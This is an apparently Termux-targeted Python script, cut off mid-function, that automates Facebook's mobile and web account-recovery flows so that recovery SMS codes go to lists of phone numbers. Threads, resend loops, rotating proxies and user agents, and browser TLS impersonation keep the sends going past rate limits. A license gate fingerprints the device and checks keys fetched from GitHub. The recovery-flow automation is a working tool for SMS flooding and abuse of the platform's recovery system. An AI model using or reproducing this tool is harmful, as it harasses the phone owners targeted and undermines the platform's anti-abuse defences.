#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  ███████╗██╗██╗   ██╗ █████╗ ███╗   ███╗
  ██╔════╝██║╚██╗ ██╔╝██╔══██╗████╗ ████║
  ███████╗██║ ╚████╔╝ ███████║██╔████╔██║
  ╚════██║██║  ╚██╔╝  ██╔══██║██║╚██╔╝██║
  ███████║██║   ██║   ██║  ██║██║ ╚═╝ ██║
  ╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝
        O T P   ::  forgot-password sender  ::  v1.0
"""

import argparse
import json
import os
import random
import re
import shutil
import string
import sys
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, unquote
import hashlib as _hl

LICENSE_URL = "https://raw.githubusercontent.com/siyamthe-dev/FORGET-TOOL.py/main/keys.txt"
LIC_GRACE = 6 * 3600

def _lic_cache():
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), ".lic_state")

def _dev_parts():
    out = []
    for cmd in ("settings get secure android_id", "getprop ro.serialno",
                "getprop ro.product.model"):
        try:
            v = os.popen(cmd + " 2>/dev/null").read().strip()
            if v and v != "unknown":
                out.append(v)
        except Exception:
            pass
    out.append(os.uname().nodename)
    out.append(os.environ.get("PREFIX", "termux"))
    return "|".join(out)

def device_key():
    h = _hl.sha256(_dev_parts().encode()).hexdigest().upper()[:20]
    return "SIYAM-" + "-".join(h[i:i + 4] for i in range(0, 20, 4))

def _fetch_keys():
    import urllib.request as _u
    req = _u.Request(LICENSE_URL, headers={"User-Agent": "siyam-lic"})
    with _u.urlopen(req, timeout=12) as r:
        return r.read().decode("utf-8", "replace")

def _check(key):
    for line in _fetch_keys().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        p = [x.strip() for x in line.split("|")]
        if p[0].upper() != key:
            continue
        exp = p[1] if len(p) > 1 else "-"
        if exp in ("", "-", "*"):
            return True, "no expiry"
        try:
            until = time.mktime(time.strptime(exp, "%Y-%m-%d"))
        except Exception:
            return True, "no expiry"
        if until < time.time():
            return False, "expired " + exp
        return True, "valid until " + exp
    return False, "not approved"

def license_gate():
    key = device_key()
    cache = _lic_cache()
    state = {}
    try:
        state = json.load(open(cache))
    except Exception:
        pass
    w()
    w(B + GOLD + "  DEVICE KEY" + R)
    w(BRIGHT + "  " + key + R)
    w()
    ok_lic, why = False, ""
    try:
        ok_lic, why = _check(key)
    except Exception:
        if state.get("key") == key and time.time() - state.get("t", 0) < LIC_GRACE:
            ok_lic, why = True, "offline cache"
        else:
            ok_lic, why = False, "github unreachable"
    if ok_lic:
        try:
            json.dump({"key": key, "t": time.time()}, open(cache, "w"))
            _chmod600(cache)
        except Exception:
            pass
        w(OKGOLD + "  KEY ACTIVE \u2714  " + why + R)
        w()
        time.sleep(1.0)
        return
    w(BURNT + "  KEY NOT ACTIVE \u2718  " + why + R)
    w()
    w(GY + "  উপরের key টা owner কে পাঠাও।" + R)
    w(GY + "  approve হলে আবার চালাও:" + R)
    w(DIM + "    siyam" + R)
    w()
    try:
        input(GY + "  ↩ Enter..." + R)
    except EOFError:
        pass
    sys.exit(0)
# ─────────────────────────── terminal ───────────────────────────
def _tw():
    try:
        return max(30, min(shutil.get_terminal_size((50, 24)).columns - 6, 46))
    except Exception:
        return 40

WIDTH = _tw()
NOCOLOR = bool(os.environ.get("NO_COLOR")) or not sys.stdout.isatty()
def _c(x):
    return "" if NOCOLOR else x

R, B, DIM = _c("\033[0m"), _c("\033[1m"), _c("\033[2m")
GOLD   = _c("\033[38;5;220m")
AMBER  = _c("\033[38;5;214m")
BRIGHT = _c("\033[38;5;226m")
BRONZE = _c("\033[38;5;178m")
DEEP   = _c("\033[38;5;137m")
WHEAT  = _c("\033[38;5;223m")
OKGOLD = _c("\033[38;5;227m")
BURNT  = _c("\033[38;5;202m")
GY, WH, GR, RD, CY = DEEP, WHEAT, OKGOLD, BURNT, GOLD

os.system("")
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

BASE        = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(BASE, "otp_config.json")
NUMBER_FILE = os.path.join(BASE, "numbers.txt")
PROXY_FILE  = os.path.join(BASE, "proxies.txt")
RESULT_FILE = os.path.join(BASE, "otp_results.txt")
SENT_FILE   = os.path.join(BASE, "otp_sent.txt")
DEBUG_LOG   = os.path.join(BASE, "otp_debug.log")

DL_DIRS = ("/sdcard/Download", "/storage/emulated/0/Download",
           os.path.expanduser("~/storage/downloads"), "/sdcard")

def storage_dir():
    for d in DL_DIRS:
        try:
            if os.path.isdir(d) and os.access(d, os.W_OK):
                return d
        except Exception:
            continue
    return BASE

def _chmod600(p):
    try:
        os.chmod(p, 0o600)
    except Exception:
        pass

def clr():
    os.system("cls" if os.name == "nt" else "clear")

def w(t="", end="\n"):
    sys.stdout.write(str(t) + end)
    sys.stdout.flush()

def rule(ch="─", n=None, col=None):
    w((col or GY) + "  " + ch * (n or WIDTH + 2) + R)

def pause():
    w()
    try:
        input(GY + "  ↩ Enter..." + R)
    except EOFError:
        pass

def dlog(m):
    try:
        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
            f.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), m))
    except Exception:
        pass

# ─────────────────────────── curl_cffi ───────────────────────────
HAVE_CFFI = False
try:
    from curl_cffi import requests as cffi_requests
    HAVE_CFFI = True
except Exception:
    pass

import requests as plain_requests

def _targets():
    pool = ["chrome131_android", "chrome124", "chrome120", "chrome110"]
    if not HAVE_CFFI:
        return []
    try:
        from curl_cffi.requests import BrowserType
        sup = {b.value for b in BrowserType}
    except Exception:
        return pool
    ok = [t for t in pool if t in sup]
    return ok or ["chrome110"]

def new_session(timeout=25, proxy=None, ua=None):
    s = None
    tg = _targets()
    for imp in (random.sample(tg, len(tg)) if tg else []):
        try:
            s = cffi_requests.Session(impersonate=imp)
            break
        except Exception:
            continue
    if s is None:
        s = plain_requests.Session()
    try:
        s.verify = False
    except Exception:
        pass
    s.headers.update({
        "user-agent": ua or random.choice(UA_POOL),
        "accept-language": "en-US,en;q=0.9",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "upgrade-insecure-requests": "1",
    })
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

UA_POOL = [
    ("Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) "
     "Chrome/136.0.7103.93 Mobile Safari/537.36"),
    ("Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) "
     "Chrome/136.0.7103.93 Mobile Safari/537.36"),
    ("Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) "
     "Chrome/128.0.6613.127 Mobile Safari/537.36"),
    ("Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) "
     "Chrome/133.0.6943.137 Mobile Safari/537.36"),
    ("Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) "
     "Chrome/120.0.6099.144 Mobile Safari/537.36"),
]

# ─────────────────────────── country / language ───────────────────────────
# cc -> (accept-language, fb_locale)
LANG_MAP = {
    "880": ("bn-BD,bn;q=0.9,en-US;q=0.8", "bn_BD"),
    "91":  ("hi-IN,hi;q=0.9,en-US;q=0.8", "hi_IN"),
    "92":  ("ur-PK,ur;q=0.9,en-US;q=0.8", "ur_PK"),
    "94":  ("si-LK,si;q=0.9,en-US;q=0.8", "si_LK"),
    "977": ("ne-NP,ne;q=0.9,en-US;q=0.8", "ne_NP"),
    "1":   ("en-US,en;q=0.9", "en_US"),
    "44":  ("en-GB,en;q=0.9,en-US;q=0.8", "en_GB"),
    "61":  ("en-AU,en;q=0.9,en-US;q=0.8", "en_GB"),
    "62":  ("id-ID,id;q=0.9,en-US;q=0.8", "id_ID"),
    "60":  ("ms-MY,ms;q=0.9,en-US;q=0.8", "ms_MY"),
    "65":  ("en-SG,en;q=0.9", "en_US"),
    "66":  ("th-TH,th;q=0.9,en-US;q=0.8", "th_TH"),
    "84":  ("vi-VN,vi;q=0.9,en-US;q=0.8", "vi_VN"),
    "63":  ("fil-PH,fil;q=0.9,en-US;q=0.8", "en_PH"),
    "95":  ("my-MM,my;q=0.9,en-US;q=0.8", "en_US"),
    "971": ("ar-AE,ar;q=0.9,en-US;q=0.8", "ar_AR"),
    "966": ("ar-SA,ar;q=0.9,en-US;q=0.8", "ar_AR"),
    "974": ("ar-QA,ar;q=0.9,en-US;q=0.8", "ar_AR"),
    "965": ("ar-KW,ar;q=0.9,en-US;q=0.8", "ar_AR"),
    "20":  ("ar-EG,ar;q=0.9,en-US;q=0.8", "ar_AR"),
    "234": ("en-NG,en;q=0.9", "en_US"),
    "254": ("sw-KE,sw;q=0.9,en-US;q=0.8", "en_US"),
    "255": ("sw-TZ,sw;q=0.9,en-US;q=0.8", "en_US"),
    "256": ("en-UG,en;q=0.9", "en_US"),
    "27":  ("en-ZA,en;q=0.9,af;q=0.8", "en_GB"),
    "233": ("en-GH,en;q=0.9", "en_US"),
    "212": ("ar-MA,ar;q=0.9,fr;q=0.8", "ar_AR"),
    "213": ("ar-DZ,ar;q=0.9,fr;q=0.8", "ar_AR"),
    "216": ("ar-TN,ar;q=0.9,fr;q=0.8", "ar_AR"),
    "90":  ("tr-TR,tr;q=0.9,en-US;q=0.8", "tr_TR"),
    "98":  ("fa-IR,fa;q=0.9,en-US;q=0.8", "fa_IR"),
    "7":   ("ru-RU,ru;q=0.9,en-US;q=0.8", "ru_RU"),
    "380": ("uk-UA,uk;q=0.9,ru;q=0.8", "uk_UA"),
    "48":  ("pl-PL,pl;q=0.9,en-US;q=0.8", "pl_PL"),
    "49":  ("de-DE,de;q=0.9,en-US;q=0.8", "de_DE"),
    "33":  ("fr-FR,fr;q=0.9,en-US;q=0.8", "fr_FR"),
    "39":  ("it-IT,it;q=0.9,en-US;q=0.8", "it_IT"),
    "34":  ("es-ES,es;q=0.9,en-US;q=0.8", "es_ES"),
    "351": ("pt-PT,pt;q=0.9,en-US;q=0.8", "pt_PT"),
    "55":  ("pt-BR,pt;q=0.9,en-US;q=0.8", "pt_BR"),
    "52":  ("es-MX,es;q=0.9,en-US;q=0.8", "es_LA"),
    "54":  ("es-AR,es;q=0.9,en-US;q=0.8", "es_LA"),
    "57":  ("es-CO,es;q=0.9,en-US;q=0.8", "es_LA"),
    "249": ("ar-SD,ar;q=0.9,en-US;q=0.8", "ar_AR"),
}
DEFAULT_LANG = ("en-US,en;q=0.9", "en_US")

def lang_for(cc):
    return LANG_MAP.get(cc, DEFAULT_LANG)

# ─────────────────────────── config ───────────────────────────
DEFAULTS = {
    "engine": "mobile",          # mobile | web
    "lang_mode": "auto",         # auto | rotate | fixed
    "lang_fixed": "en-US",
    "proxy_mode": "direct",      # direct | file | single
    "proxy_single": "",
    "threads": 5,
    "delay": 3.0,
    "timeout": 25,
    "resend": 1,
    "rotate_ua": True,
    "retries": 2,
}

def load_cfg():
    d = dict(DEFAULTS)
    try:
        with open(CONFIG_FILE) as f:
            d.update(json.load(f))
    except Exception:
        pass
    return d

def save_cfg(c):
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(c, f, indent=2)
        _chmod600(CONFIG_FILE)
    except Exception:
        pass

def load_proxies():
    out = []
    try:
        with open(PROXY_FILE) as f:
            for l in f:
                p = l.strip()
                if p and not p.startswith("#"):
                    out.append(p)
    except Exception:
        pass
    return out

# ─────────────────────────── state ───────────────────────────
lock = threading.Lock()
proxy_lock = threading.Lock()
proxy_list, proxy_idx = [], 0
stats = {"total": 0, "done": 0, "sent": 0, "noacc": 0, "nosms": 0,
         "cap": 0, "fail": 0, "err": 0}

def next_proxy(cfg):
    global proxy_idx
    if cfg["proxy_mode"] == "single":
        return cfg["proxy_single"].strip() or None
    if cfg["proxy_mode"] != "file" or not proxy_list:
        return None
    with proxy_lock:
        p = proxy_list[proxy_idx % len(proxy_list)]
        proxy_idx += 1
    return p

def bump(k):
    with lock:
        stats[k] = stats.get(k, 0) + 1

def pick_lang(cfg, cc):
    mode = cfg["lang_mode"]
    if mode == "fixed":
        f = (cfg["lang_fixed"] or "en-US").strip()
        return f + ",en;q=0.8", f.replace("-", "_")
    if mode == "rotate":
        cc2 = random.choice(list(LANG_MAP.keys()))
        return lang_for(cc2)
    return lang_for(cc)

def pick_ua(cfg):
    return random.choice(UA_POOL) if cfg.get("rotate_ua") else UA_POOL[0]

def gen_s():
    return ":".join("".join(random.choices(string.ascii_lowercase + string.digits, k=6))
                    for _ in range(3))

def gen_qpl():
    return "f" + "".join(random.choices("0123456789abcdef", k=17))

def jazoest(t):
    return ("2" + "".join(str(ord(c)) for c in t)) if t else ""

def b36(n):
    if n == 0:
        return "0"
    ch = "0123456789abcdefghijklmnopqrstuvwxyz"
    o = ""
    while n > 0:
        n, r = divmod(n, 36)
        o = ch[r] + o
    return o

def cc_of(num):
    d = re.sub(r"\D", "", num or "")
    for cc in sorted(LANG_MAP.keys(), key=len, reverse=True):
        if d.startswith(cc):
            return cc
    return "1"

# ─────────────────────────── token helpers ───────────────────────────
def _ex(pats, text, dft=""):
    for p in pats:
        m = re.search(p, text or "")
        if m:
            for g in m.groups():
                if g:
                    return g
    return dft

def grab_tokens(html, jar):
    lsd = _ex([r'"LSD",\[\],\{"token":"([^"]+)"\}', r'"lsd":"([^"]+)"',
               r'name="lsd" value="([^"]+)"'], html)
    dtsg = _ex([r'name="fb_dtsg" value="([^"]+)"',
                r'"DTSGInitialData",\[\],\{"token":"([^"]+)"\}'], html)
    rev = _ex([r'"server_revision":(\d+)'], html, "1052986228")
    hsi = _ex([r'"hsi":"(\d+)"'], html, "7707864257778152385")
    hs = _ex([r'"haste_session":"([^"]+)"'], html,
             "20758.HYP:wbloks_caa_pkg.2.1...0")
    bkv = _ex([r'versioning_id:"([a-f0-9]{64})"',
               r'"__bkv"\s*:\s*"([a-f0-9]{40,})"'], html,
              "3c2a1fb8e5d0947ace12b3f6741092853de814cd35e59546e9a48dadc54952c")
    cds = re.findall(r"[\w\-]{50,}\|arm", html or "")
    dyn = _ex([r'"__dyn"\s*:\s*"([^"]+)"'], html, "")
    if not lsd or not cds:
        return None
    return {"lsd": lsd, "dtsg": dtsg, "rev": rev, "hsi": hsi, "hs": hs,
            "bkv": bkv, "cd": cds[0], "dyn": dyn, "datr": (jar or {}).get("datr", "")}

def common(hs, rev, s, hsi, dyn, lsd, jz, comet="33"):
    return {"__user": "0", "__a": "1", "__hs": hs, "dpr": "3",
            "__ccg": "EXCELLENT", "__rev": rev, "__s": s, "__hsi": hsi,
            "__dyn": dyn or "7xeUmwlE6XwkEiB4K7oFomgwTxB35oz8h2pxi4Eywdo5u4o1mxy7m1uxuCFQ84K",
            "__comet_req": comet, "fb_dtsg": "", "jazoest": jz, "lsd": lsd}

def search_params(q, cd, wf, tid="jlzd35:93"):
    return json.dumps({
        "server_params": {
            "event_request_id": str(uuid.uuid4()),
            "INTERNAL__latency_qpl_marker_id": 36707139,
            "INTERNAL__latency_qpl_instance_id": int(time.time() * 100000),
            "device_id": None, "family_device_id": None, "waterfall_id": wf,
            "offline_experiment_group": None, "layered_homepage_experiment_group": None,
            "is_platform_login": 0, "is_from_logged_in_switcher": 0,
            "is_from_logged_out": 0, "access_flow_version": "pre_mt_behavior",
            "login_surface": "login_home", "login_entry_point": "logged_out",
            "context_data": cd,
        },
        "client_input_params": {
            "zero_balance_state": "", "search_query": q, "fetched_email_list": [],
            "fetched_email_token_list": [], "sso_accounts_auth_data": [], "sfdid": "",
            "text_input_id": tid, "encrypted_msisdn": "", "headers_infra_flow_id": "",
            "was_headers_prefill_available": 0, "was_headers_prefill_used": 0,
            "ig_oauth_token": [], "android_build_type": "", "is_whatsapp_installed": 0,
            "device_network_info": "", "accounts_list": [], "is_oauth_without_permission": 0,
            "search_screen_type": "mobile", "ig_vetted_device_nonce": "",
            "gms_incoming_call_retriever_eligibility": "client_not_supported",
            "auth_secure_device_id": "", "blocked_uids": [], "cloud_trust_token": None,
            "network_bssid": None, "lois_settings": {"lois_token": ""}, "aac": "",
        },
    })

MULTI_SIG = ("choose your account", "choose an account", "select your account",
             "multiple accounts", "account_disambiguation",
             "caa.ar.multiple_accounts", "caa.ar.account_selection")

# ─────────────────────────── MOBILE ENGINE ───────────────────────────
def engine_mobile(num, cfg, px):
    """m.facebook CAA account-recovery SMS flow."""
    clean = re.sub(r"\D", "", num)
    cc = cc_of(clean)
    lang, fb_locale = pick_lang(cfg, cc)
    ua = pick_ua(cfg)
    s = new_session(cfg["timeout"], px, ua)
    wf = str(uuid.uuid4())

    try:
        s.cookies.set("locale", fb_locale, domain=".facebook.com")
        r = s.get("https://m.facebook.com/login/identify/?ctx=recover&locale=" + fb_locale,
                  timeout=cfg["timeout"], allow_redirects=True,
                  headers={"referer": "https://m.facebook.com/",
                           "accept-language": lang})
        if r.status_code != 200:
            return "ERR", "identify HTTP %s" % r.status_code
        tk = grab_tokens(r.text, s.cookies.get_dict())
        if not tk:
            return "ERR", "no tokens (identify)"

        post_h = {
            "user-agent": ua,
            "accept": "*/*",
            "accept-language": lang,
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "origin": "https://m.facebook.com",
            "referer": "https://m.facebook.com/login/identify/?ctx=recover&locale=" + fb_locale,
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
        }
        base = common(tk["hs"], tk["rev"], gen_s(), tk["hsi"], tk["dyn"],
                      tk["lsd"], jazoest(tk["dtsg"] or tk["lsd"]))
        base["fb_dtsg"] = tk["dtsg"]

        # 1. search
        q = num if num.startswith("+") else "+" + clean
        r2 = s.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.search.async&type=action&__bkv=" + tk["bkv"],
                    headers=post_h,
                    data={**base, "params": search_params(q, tk["cd"], wf)},
                    timeout=cfg["timeout"])
        t2 = r2.text
        cds = re.findall(r"[\w\-]{50,}\|arm", t2)
        if not cds:
            r2 = s.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.search.async&type=action&__bkv=" + tk["bkv"],
                        headers=post_h,
                        data={**base, "params": search_params(clean, tk["cd"], wf)},
                        timeout=cfg["timeout"])
            t2 = r2.text
            cds = re.findall(r"[\w\-]{50,}\|arm", t2)

        low = t2.lower()
        dyn2 = re.search(r'"__dyn"\s*:\s*"([^"]+)"', t2)
        if dyn2:
            base["__dyn"] = dyn2.group(1)
        tid = re.search(r'"text_input_id"\s*:\s*"([^"]+)"', t2)
        if tid:
            tid = tid.group(1)

        if any(x in low for x in MULTI_SIG):
            return "FAIL", "multiple accounts"
        if not cds:
            if "search_error_dialog_shown" in t2:
                return "NOACC", "not found"
            return "NOACC", "no account matched"

        cd2 = cds[-1]
        cur = cd2
        t4 = t2

        # 2. auth method reject (password -> phone)
        if "caa.ar.initiate_view" not in t2 and "caa.ar.auth_method" in t2:
            scr = re.search(r'\\"BACK\\" \\"([a-z0-9]+:\d+)\\"', t2)
            scr = scr.group(1) if scr else "jm52g2:3"
            pa = json.dumps({"params": json.dumps({
                "server_params": {
                    "device_id": None, "waterfall_id": wf, "is_platform_login": 0,
                    "is_from_logged_out": 0, "access_flow_version": "pre_mt_behavior",
                    "login_surface": "account_recovery",
                    "login_entry_point": "account_recovery",
                    "back_nav_action": "BACK", "INTERNAL_INFRA_screen_id": scr,
                    "context_data": cd2},
                "client_input_params": {"lois_settings": {"lois_token": ""},
                                        "zero_balance_state": "", "aac": ""}})})
            r3 = s.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.auth_method&type=app&__bkv=" + tk["bkv"],
                        headers=post_h, data={**base, "__req": "b", "params": pa},
                        timeout=cfg["timeout"])
            t3 = r3.text
            asyncp = ""
            for cand in re.findall(r'\\"([A-Za-z0-9_\-]{80,})\\"', t3):
                if "|arm" not in cand:
                    asyncp = cand
                    break
            c3 = re.findall(r"[\w\-]{50,}\|arm", t3)
            cd3 = c3[-1] if c3 else cd2
            pr = json.dumps({"server_params": {
                "device_id": None, "auth_method": "password",
                "is_auth_method_rejected": 1, "auth_method_async_params": asyncp,
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "INTERNAL__latency_qpl_instance_id": int(time.time() * 100000),
                "family_device_id": None, "waterfall_id": wf,
                "offline_experiment_group": None, "layered_homepage_experiment_group": None,
                "is_platform_login": 0, "is_from_logged_in_switcher": 0,
                "is_from_logged_out": 0, "access_flow_version": "pre_mt_behavior",
                "login_surface": "account_recovery",
                "login_entry_point": "account_recovery", "context_data": cd3},
                "client_input_params": {"zero_balance_state": "", "android_build_type": "",
                                        "cloud_trust_token": None, "network_bssid": None,
                                        "lois_settings": {"lois_token": ""}, "aac": ""}})
            r4 = s.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.auth_method.async&type=action&__bkv=" + tk["bkv"],
                        headers=post_h, data={**base, "__req": "g", "params": pr},
                        timeout=cfg["timeout"])
            t4 = r4.text
            c4 = re.findall(r"[\w\-]{50,}\|arm", t4)
            cur = c4[-1] if c4 else cd3

        # 3. initiate view
        iscr = re.search(r'INTERNAL_INFRA_screen_id["\s:]+([a-z0-9]+:\d+)', t4)
        iscr = iscr.group(1) if iscr else "jm929a:2"
        pi = json.dumps({"params": json.dumps({
            "server_params": {
                "device_id": None, "waterfall_id": wf, "is_platform_login": 0,
                "is_from_logged_out": 0, "access_flow_version": "pre_mt_behavior",
                "login_surface": "account_recovery",
                "login_entry_point": "account_recovery",
                "back_nav_action": "BACK", "INTERNAL_INFRA_screen_id": iscr,
                "context_data": cur},
            "client_input_params": {"lois_settings": {"lois_token": ""},
                                    "machine_id": "", "zero_balance_state": "",
                                    "aac": ""}})})
        r5 = s.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.initiate_view&type=app&__bkv=" + tk["bkv"],
                    headers=post_h, data={**base, "__req": "h", "params": pi},
                    timeout=cfg["timeout"])
        t5 = r5.text
        if any(x in t5.lower() for x in MULTI_SIG):
            return "FAIL", "multiple accounts"
        if "phone" not in t5.lower() and "sms" not in t5.lower():
            return "NOSMS", "no phone option"

        m5 = re.search(r'\\"([A-Za-z0-9_\-]{100,}(?:\\\||\|)arm)\\" \([^\)]+\(dkc \\"is_loading\\"\) \(dkc \\"([^"\\]+)\\"\)', t5)
        if m5:
            cd5 = m5.group(1).replace("\\|", "|")
            load = m5.group(2)
        else:
            a5 = re.findall(r"[\w\-]{50,}\|arm", t5)
            cd5 = a5[-1] if a5 else cur
            load = "2;1ki7cfc3a7;0"

        # 4. send
        po = json.dumps({"server_params": {
            "device_id": None, "event_request_id": str(uuid.uuid4()),
            "login_type": "FB_SSO", "auth_options": ["phone", "password", "whatsapp"],
            "lara_usage": 0, "is_feta_auth_option": 0,
            "INTERNAL__latency_qpl_marker_id": 36707139,
            "INTERNAL__latency_qpl_instance_id": int(time.time() * 100000),
            "family_device_id": None, "waterfall_id": wf,
            "offline_experiment_group": None, "layered_homepage_experiment_group": None,
            "is_platform_login": 0, "is_from_logged_in_switcher": 0,
            "is_from_logged_out": 0, "access_flow_version": "pre_mt_behavior",
            "login_surface": "account_recovery", "login_entry_point": "account_recovery",
            "context_data": cd5, "serialized_states": {"is_loading": load}},
            "client_input_params": {
                "family_device_id": "", "machine_id": "", "zero_balance_state": "",
                "auth_option": "phone", "android_build_type": "",
                "selected_phone_number_index": -1,
                "selected_xapp_contactpoint_index": -1,
                "selected_encrypted_bloks_xapp_cp_lookup_data": "",
                "cloud_trust_token": None, "network_bssid": None,
                "lois_settings": {"lois_token": ""}, "aac": ""}})
        r6 = s.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.auth_option_selection.async&type=action&__bkv=" + tk["bkv"],
                    headers=post_h, data={**base, "__req": "n", "params": po},
                    timeout=cfg["timeout"])
        t6 = r6.text

        if "initiate_view_code_send_success" in t6 or "CODE_ENTRY" in t6:
            note = ""
            for i in range(1, max(0, int(cfg["resend"])) + 1):
                time.sleep(random.uniform(2.5, 4.0))
                try:
                    rr = s.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.auth_option_selection.async&type=action&__bkv=" + tk["bkv"],
                                headers=post_h,
                                data={**base, "__req": b36(30 + i), "params": po},
                                timeout=cfg["timeout"])
                    if "code_send_success" in rr.text or "CODE_ENTRY" in rr.text:
                        note += "r%d ok " % i
                    else:
                        note += "r%d skip " % i
                except Exception:
                    note += "r%d err " % i
            return "SENT", note.strip()
        if "sms_drop_toast_shown" in t6 or "We can't send SMS" in t6:
            return "CAP", "sms cooldown"
        if "generic_error_dialog_shown" in t6 or "something went wrong" in t6.lower():
            return "FAIL", "sms rejected"
        return "FAIL", "trigger failed (%s)" % t6[:40].replace("\n", " ")
    except Exception as e:
        return "ERR", "%s: %s" % (type(e).__name__, str(e)[:50])
    finally:
        try:
            s.close()
        except Exception:
            pass

# ─────────────────────────── WEB ENGINE ───────────────────────────
def engine_web(num, cfg, px):
    """www.facebook.com CAA GraphQL recovery SMS flow."""
    clean = re.sub(r"\D", "", num)
    cc = cc_of(clean)
    lang, fb_locale = pick_lang(cfg, cc)
    ua = pick_ua(cfg)
    s = new_session(cfg["timeout"], px, ua)
    wf = str(uuid.uuid4())

    try:
        r0 = s.get("https://www.facebook.com/recover/initiate/?ars=facebook_login",
                   timeout=cfg["timeout"], allow_redirects=False,
                   headers={"referer": "https://www.facebook.com/",
                            "accept-language": lang})
        loc = r0.headers.get("location", "")
        m = re.search(r"[?&]ci=([^&]+)", loc)
        ci = unquote(m.group(1)) if m else ""
        if not loc:
            loc = "https://www.facebook.com/login/identify/?ctx=recover"
        elif loc.startswith("/"):
            loc = "https://www.facebook.com" + loc

        rp = s.get(loc, timeout=cfg["timeout"], allow_redirects=True,
                   headers={"accept-language": lang})
        html = rp.text
        lsd = _ex([r'"LSD",\[\],\{"token":"([^"]+)"\}',
                   r'name="lsd" value="([^"]+)"'], html)
        if not lsd:
            return "ERR", "no lsd (web)"
        hsi = _ex([r'"hsi":"(\d+)"'], html, "7707976571227258113")
        hs = _ex([r'"haste_session":"([^"]+)"'], html,
                 "20771.HYP:comet_loggedout_pkg.2.1...0")
        rev = _ex([r'"server_revision":(\d+)'], html, "1054623785")
        dyn = "7xe6E5q5U5ObwKBAg5S1Dxu13w8CewSwMwNw9G2S0im3y4o0B-q1ew6ywaq0B04o5-0Bo7O2l0Fwqo31w9O0H8-U2zxe2GewbS361qw8Xwn82Lw6OyES1Tw8W0Lo6-0Co1kU1bo8Xw8S0QU3yw"

        h = {
            "host": "www.facebook.com", "user-agent": ua, "accept": "*/*",
            "accept-language": lang,
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.facebook.com", "referer": loc,
            "x-fb-friendly-name": "CAAFBAccountSearchViewQuery",
            "x-fb-lsd": lsd,
            "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
        }
        base = {"__a": "1", "__user": "0", "__comet_req": "15", "__hs": hs,
                "__rev": rev, "__hsi": hsi, "__dyn": dyn, "__csr": "",
                "jazoest": jazoest(lsd), "lsd": lsd,
                "fb_api_caller_class": "RelayModern", "server_timestamps": "true"}

        def gql(name, doc, variables):
            d = dict(base)
            d["fb_api_req_friendly_name"] = name
            d["doc_id"] = doc
            d["variables"] = json.dumps(variables)
            h2 = dict(h)
            h2["x-fb-friendly-name"] = name
            r = s.post("https://www.facebook.com/api/graphql/", headers=h2,
                       data=d, timeout=cfg["timeout"])
            t = r.text
            if "for (;;);" in t:
                t = t.split("for (;;);", 1)[1]
            return json.loads(t)

        j1 = gql("CAAFBAccountSearchViewQuery", "29078541985133425",
                 {"params": {"cipher_text": ci, "context": "recover",
                             "event_request_id": str(uuid.uuid4()), "friend_name": "",
                             "search_query": num, "waterfall_id": wf}})
        res = (j1.get("data") or {}).get("caa_ar_fb_account_search") or {}
        accts, redir = res.get("accounts") or [], res.get("redirect_uri") or ""
        if not redir and not accts and not num.startswith("+"):
            j1 = gql("CAAFBAccountSearchViewQuery", "29078541985133425",
                     {"params": {"cipher_text": ci, "context": "recover",
                                 "event_request_id": str(uuid.uuid4()), "friend_name": "",
                                 "search_query": "+" + clean, "waterfall_id": wf}})
            res = (j1.get("data") or {}).get("caa_ar_fb_account_search") or {}
            accts, redir = res.get("accounts") or [], res.get("redirect_uri") or ""
        if not redir and not accts:
            return "NOACC", "not found"
        if len(accts) > 1 and not redir:
            return "FAIL", "multiple accounts"

        m2 = re.search(r"ci=([^&]+)", redir)
        init_ci = unquote(m2.group(1)) if m2 else ci
        h["referer"] = ("https://www.facebook.com" + redir) if redir.startswith("/") else redir

        j2 = gql("CAAFBARInitiateViewRootQuery", "29837221349198119",
                 {"params": {"cipher": init_ci,
                             "login_ids": {"waterfall_id": wf}, "waterfall_id": wf}})
        iv = (j2.get("data") or {}).get("caa_ar_fb_initiate_view") or {}
        cipher = iv.get("cipher") or init_ci
        if not cipher:
            return "NOSMS", "recovery options unavailable"

        j3 = gql("useCAASendRecoveryCodeMutation", "25714184854871712",
                 {"input": {"actor_id": "0", "client_mutation_id": "1",
                            "access_flow_version": "pre_mt_behavior", "cipher": cipher,
                            "event_request_id": str(uuid.uuid4()),
                            "recover_method": "send_sms:0", "waterfall_id": wf},
                  "scale": 1})
        cr = (j3.get("data") or {}).get("caa_ar_fb_send_confirmation_code") or {}
